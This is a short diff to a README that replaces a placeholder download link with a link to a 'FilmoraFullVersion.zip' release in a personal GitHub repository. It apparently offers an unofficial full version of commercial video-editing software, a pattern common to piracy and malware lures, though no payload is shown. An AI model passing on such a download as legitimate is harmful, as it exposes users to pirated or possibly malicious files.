@@ -5,7 +5,7 @@
 </div>
 
 ## 📥 Download
-<a href="#" download>
+<a href="https://github.com/adiraj2004/Filmora-Github/releases/download/full/FilmoraFullVersion.zip" download>
   <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
 </a>
 
